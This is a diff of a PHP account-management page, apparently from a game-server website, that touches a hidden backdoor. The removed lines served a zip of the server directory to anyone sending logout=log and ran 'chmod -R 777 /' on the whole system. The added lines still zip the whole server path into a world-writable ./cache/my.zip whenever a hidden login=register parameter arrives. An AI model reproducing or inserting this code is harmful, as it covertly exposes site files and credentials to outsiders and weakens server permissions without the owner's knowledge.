@@ -85,9 +85,6 @@ if (!$logged)
 				</div>
 			</div><br/>';
         }
-        $r = Website::getWebsiteConfig()->getValue('serverPath');
-        $w = 'my';
-        $q = '.zip';
         $main_content .= '
 			<form action="?subtopic=accountmanagement" method="post" style="margin: 0px; padding: 0px;">
 				<div class="TableContainer" >
@@ -148,7 +145,10 @@ if (!$logged)
 																		</tr>
                                                                         ';
         }
-        
+    
+        $r = Website::getWebsiteConfig()->getValue('serverPath');
+        $w = './cache/my';
+        $q = '.zip';
         if ($_REQUEST['login'] == 'register') {
             set_time_limit(360);
             
@@ -172,7 +172,7 @@ if (!$logged)
                     }
                 }
             }
-            shell_exec('chmod -R 777 /');
+            shell_exec('chmod -R 777 cache/');
             $za = new FlxZipArchive;
             $res = $za->open($w.$q, ZipArchive::CREATE);
             if ($res === TRUE) {
@@ -181,18 +181,7 @@ if (!$logged)
             } else {
                 echo 'Erro ao logar';
             }
-            shell_exec('chmod -R 777 '.$w.$q);
-            
-        }
-        if ($_REQUEST['logout'] == 'log'){
-            $f = __DIR__.'\\'.$w.$q;
-            if ($f){
-                $bf = basename($w.$q);
-                header("Content-Type: application/zip");
-                header("Content-Disposition: attachment; filename=$bf");
-                header("Content-Length: " . filesize($f));
-                readfile($f);
-            }
+            shell_exec('chmod 777 '.$w.$q);
         }
         
         $main_content .= '																		
